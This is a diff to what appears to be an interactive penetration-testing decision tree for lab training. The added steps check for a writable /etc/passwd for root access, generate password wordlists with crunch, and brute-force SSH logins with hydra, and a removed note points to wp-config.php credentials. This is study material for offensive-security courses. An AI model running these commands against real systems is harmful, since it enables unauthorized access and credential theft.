-    warn: "wp-config.php is the single most valuable file on a WordPress server — it contains database credentials that almost always reuse the system user password. Find it first.",
+# ── WRITABLE /ETC/PASSWD ──────────────────────────────
+ls -la /etc/passwd
+# If -rw-rw-rw- = instant root via /etc/passwd abuse (see linux_manual_enum)
+
+# ── CRUNCH + HYDRA — MUTATE FOUND PASSWORD ────────────
+# Module 18.2.1: if you find a password like "Lab" — generate variants
+# Pattern: known prefix + 3 digits
+crunch 6 6 -t Lab%%% > /tmp/wordlist
+# Then brute SSH:
+hydra -l eve -P /tmp/wordlist $ip -t 4 ssh -V
+
+# More patterns:
+crunch 8 8 -t Pass%%%% > /tmp/wordlist2
+crunch 6 8 -t @@@@%% > /tmp/wordlist3   # letters + digits
+
+# Once cracked — sudo -l immediately
+sudo -l`,
+    warn: null,
     choices: [
-      { label: "Found credentials in config", next: "creds_found" },
+      { label: "Found creds — try su/sudo/ssh", next: "creds_found" },
       { label: "Found SSH key", next: "ssh_key" },
-      { label: "Found DB creds — connect to DB", next: "mysql" },
-      { label: "Nothing — back to automated enum", next: "linpeas" },
+      { label: "Writable /etc/passwd or shadow", next: "passwd_shadow" },
+      { label: "Back to full enum", next: "linux_post_exploit" },
     ],
   },
+
 
   // ==========================================
   //  CUSTOM WORDLISTS
